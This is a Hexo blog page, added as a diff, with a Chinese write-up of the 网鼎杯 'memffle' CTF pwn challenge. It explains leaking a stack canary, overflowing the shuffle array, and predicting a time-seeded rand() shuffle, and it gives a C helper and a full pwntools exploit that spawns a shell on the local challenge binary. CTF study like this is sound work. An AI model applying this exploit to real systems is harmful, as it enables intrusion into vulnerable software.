@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>随机数(网鼎杯2_memffle) | Tower</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="题目链接：https://github.com/tower111/software 1234567➜  memffle git:(master) ✗ checksec pwn      [*] &amp;apos;/home/liu/1t/u18/mygit/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf2/memffle/memffle/pwn&amp;apos;    Arch:">
+<meta name="keywords" content="引用外部c程序获取随机数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="随机数(网鼎杯2_memffle)">
+<meta property="og:url" content="http://yoursite.com/2018/09/05/随机数-网鼎杯2-memffle/index.html">
+<meta property="og:site_name" content="Tower">
+<meta property="og:description" content="题目链接：https://github.com/tower111/software 1234567➜  memffle git:(master) ✗ checksec pwn      [*] &amp;apos;/home/liu/1t/u18/mygit/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf2/memffle/memffle/pwn&amp;apos;    Arch:">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-09-05T13:22:23.660Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="随机数(网鼎杯2_memffle)">
+<meta name="twitter:description" content="题目链接：https://github.com/tower111/software 1234567➜  memffle git:(master) ✗ checksec pwn      [*] &amp;apos;/home/liu/1t/u18/mygit/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf2/memffle/memffle/pwn&amp;apos;    Arch:">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <!-- <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'> -->
+  <!-- <link href="//fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css"> -->
+  <link href="//fonts.useso.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
+  <link href='//fonts.useso.com/css?family=Open+Sans:300,600' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <a href="/" class="logo">Tower</a>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about/index.html">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        </div>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        
+        
+          <a id="nav-github-link" class="nav-icon" href="https://tower111.github.io/" title="Fork me on GitHub"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <nav id="mobile-nav" class="off">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/index.html" class="mobile-nav-link">About</a>
+  
+  <div id="search-form-wrap-mobile">
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+  </div>
+</nav>
+      <div class="outer">
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/09/05/随机数-网鼎杯2-memffle/">随机数(网鼎杯2_memffle)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/02/网鼎杯2-fgo/">网鼎杯2(fgo)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/02/ISG/">ISG</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/01/hose-of-lore/">hose of lore</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/31/堆中获取地址和劫持执行流的方法/">堆中获取地址和劫持执行流的方法</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆攻击模型/">堆攻击模型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/引用外部c程序获取随机数/">引用外部c程序获取随机数</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/double-free-unlink/" style="font-size: 10px;">double free,unlink</a> <a href="/tags/基础知识/" style="font-size: 10px;">基础知识</a> <a href="/tags/堆攻击模型/" style="font-size: 10px;">堆攻击模型</a> <a href="/tags/堆溢出-house-of-einherjar/" style="font-size: 10px;">堆溢出,house of einherjar</a> <a href="/tags/引用外部c程序获取随机数/" style="font-size: 10px;">引用外部c程序获取随机数</a> <a href="/tags/技巧，堆溢出，总结/" style="font-size: 10px;">技巧，堆溢出，总结</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">links</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://github.com/tower111/tower111.github.io.git">Hexo</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+        <section id="main"><article id="post-随机数-网鼎杯2-memffle" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/05/随机数-网鼎杯2-memffle/" class="article-date">
+  <time datetime="2018-09-05T04:53:45.000Z" itemprop="datePublished">2018-09-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      随机数(网鼎杯2_memffle)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>题目链接：<a href="https://github.com/tower111/software" target="_blank" rel="noopener">https://github.com/tower111/software</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  memffle git:(master) ✗ checksec pwn      </span><br><span class="line">[*] &apos;/home/liu/1t/u18/mygit/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf2/memffle/memffle/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>保护全开。<br>看一下程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">unsigned int sub_C58()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-224h]</span><br><span class="line">  unsigned int v2; // [esp+8h] [ebp-220h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-21Ch]</span><br><span class="line">  int v4; // [esp+20Ch] [ebp-1Ch]</span><br><span class="line">  int v5; // [esp+210h] [ebp-18h]</span><br><span class="line">  int v6; // [esp+214h] [ebp-14h]</span><br><span class="line">  int v7; // [esp+218h] [ebp-10h]</span><br><span class="line">  unsigned int v8; // [esp+21Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(0x14u);</span><br><span class="line">  v2 = ((unsigned int)&amp;system &amp; 0xFF000) &gt;&gt; 12;</span><br><span class="line">  memset(&amp;v3, 0, 0x200u);</span><br><span class="line">  v4 = 0;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  printf(&quot;Your name is? &quot;);</span><br><span class="line">  sub_C0F(&amp;v4, 16);</span><br><span class="line">  printf(&quot;Welcome to my in-memory shuffling service, %s!\n&quot;, &amp;v4);</span><br><span class="line">  printf(&quot;Here&apos;s a gift for you: %x\n&quot;, v2);</span><br><span class="line">  printf(&quot;How many numbers do you want to input? &quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A positive N is required!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_AAA(&amp;v3, v1);</span><br><span class="line">  puts(&quot;The array is:&quot;);</span><br><span class="line">  sub_A5D((int)&amp;v3, v1);</span><br><span class="line">  sub_9E0((int)&amp;v3, v1);</span><br><span class="line">  puts(&quot;After shuffling, the array is:&quot;);</span><br><span class="line">  sub_A5D((int)&amp;v3, v1);</span><br><span class="line">  return __readgsdword(0x14u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>输入name的时候可以输入11个字符，并且末尾不存在00可以用作泄露canary。<br>sub_9E0函数对输入进行了排序。<br>取出来随机数，用随机数排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_9E0(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int v4; // ST0C_4</span><br><span class="line">  int *v5; // edx</span><br><span class="line">  int i; // [esp+4h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  result = a2 - 1;</span><br><span class="line">  for ( i = a2 - 1; i &gt;= 0; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    v4 = *(_DWORD *)(4 * i + a1);</span><br><span class="line">    *(_DWORD *)(a1 + 4 * i) = *(_DWORD *)(4 * (v3 % (i + 1)) + a1);</span><br><span class="line">    v5 = (int *)(a1 + 4 * (v3 % (i + 1)));</span><br><span class="line">    result = v4;</span><br><span class="line">    *v5 = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>循环里面就是交换位置，这里没有限制有多少个数组，造成了栈溢出。<br>v2 = ((unsigned int)&amp;system &amp; 0xFF000) &gt;&gt; 12;这里给出了system函数的地址，2位变的已经给出了其他的位基本上不会变。通过这个地址和偏移可以计算出”/bin/sh”字符串的地址。</p>
+<p>现在整理一下思路，程序会对我们的输入进行排序，排序是随机的我们需要让排序之后canary，system，/bin/sh放在对应的位置上。</p>
+<p>网上常见的一种方法是利用自己写一个c函数来还原生成随机数，我试着还原了一下。</p>
+<p><strong>printrand.c</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;time.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    time_t seed=time(0);</span><br><span class="line">    srand(seed);</span><br><span class="line">    int v4,a;</span><br><span class="line">    int v[139];</span><br><span class="line">    for(int i=0;i&lt;139 ;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v[i]=i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=138;i&gt;=0;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        a=rand();</span><br><span class="line">        v4=v[i];</span><br><span class="line">        v[i]=v[a%(i+1)];</span><br><span class="line">        v[a%(i+1)]=v4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;bin_sh=%d\n&quot;,v[138]);</span><br><span class="line">    printf(&quot;ret=%d\n&quot;,v[136]);</span><br><span class="line">    printf(&quot;canary=%d&quot;,v[132]);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译的时候保护全部关闭<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -z norelro -no-pie printrand.c  -o printrand</span><br></pre></td></tr></table></figure></p>
+<p><strong>exp.py</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">elf=ELF(&quot;pwn&quot;)</span><br><span class="line">def load_local():</span><br><span class="line">	p=process(&quot;./pwn&quot;)</span><br><span class="line">	return p</span><br><span class="line"></span><br><span class="line">def get_canary(p):</span><br><span class="line">	p.recvuntil(&quot;Your name is? &quot;)</span><br><span class="line">	p.sendline(&quot;A&quot;*0x10+&quot;B&quot;)</span><br><span class="line">	p.recvuntil(&quot;B&quot;)</span><br><span class="line">	canary=u32(&apos;\x00&apos;+p.recv(3))</span><br><span class="line">	print &quot;canary=&quot;+hex(canary)</span><br><span class="line">	return canary</span><br><span class="line"></span><br><span class="line">def get_system(p):</span><br><span class="line">	p.recvuntil(&quot;Here&apos;s a gift for you: &quot;)</span><br><span class="line">	gift=int(p.recv(2),16)</span><br><span class="line">	system_addr=0xf7500da0</span><br><span class="line">	system_addr=system_addr|(gift&lt;&lt;12)</span><br><span class="line">	print &quot;system_addr=&quot;+hex(system_addr)</span><br><span class="line">	bin_sh=system_addr+0x120c6b</span><br><span class="line">	print &quot;bin_sh=&quot;+hex(bin_sh)</span><br><span class="line">	return system_addr,bin_sh</span><br><span class="line"></span><br><span class="line">def get_point(p):</span><br><span class="line">	output=os.popen(&quot;./printrand&quot;)</span><br><span class="line">	ret_p,canary_p,bin_sh_p=output.read().split(&quot;\n&quot;)</span><br><span class="line">	sss=[ret_p,canary_p,bin_sh_p]</span><br><span class="line">	print sss</span><br><span class="line">	for i in sss:</span><br><span class="line">		if i.startswith(&quot;ret=&quot;):</span><br><span class="line">			ret_p=i[4:]</span><br><span class="line">		if i.startswith(&quot;canary=&quot;):</span><br><span class="line">			canary_p=i[7:]</span><br><span class="line">		if i.startswith(&quot;bin_sh=&quot;):</span><br><span class="line">			bin_sh_p=i[7:]</span><br><span class="line">	print ret_p,canary_p,bin_sh_p</span><br><span class="line">	return ret_p,canary_p,bin_sh_p</span><br><span class="line"></span><br><span class="line">def get_shell(p):</span><br><span class="line">	p.recvuntil(&quot;How many numbers do you want to input? &quot;)</span><br><span class="line">	p.sendline(&quot;139&quot;)</span><br><span class="line">	for i in range(139):</span><br><span class="line">		p.recvuntil(&quot;number: &quot;)</span><br><span class="line">		if str(i)==ret_p:</span><br><span class="line">			p.sendline(str(int(system_addr)))</span><br><span class="line">		elif str(i)==canary_p:</span><br><span class="line">			p.sendline(str(int(canary)))</span><br><span class="line">		elif str(i)==bin_sh_p:</span><br><span class="line">			p.sendline(str(int(bin_sh)))</span><br><span class="line">		else:</span><br><span class="line">			p.sendline(&quot;1111&quot;) </span><br><span class="line">		print i,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=load_local()</span><br><span class="line">canary=get_canary(p)</span><br><span class="line">system_addr,bin_sh=get_system(p)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">ret_p,canary_p,bin_sh_p=get_point(p)</span><br><span class="line">get_shell(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>封装到一个函数里看着还真有一点大佬风范^_^。</p>
+<p>之前见过用python脚本加载动态链接库，直接生成随机数但是技术不太成熟，暂时整不出来了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/09/05/随机数-网鼎杯2-memffle/" data-id="cjlp6bb9n000iesl3vz414ra5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/引用外部c程序获取随机数/">引用外部c程序获取随机数</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/02/网鼎杯2-fgo/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">网鼎杯2(fgo)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <a href="/" class="logo">Tower</a>
+      &copy; 2018 tower<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/jquery.scrollLoading.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
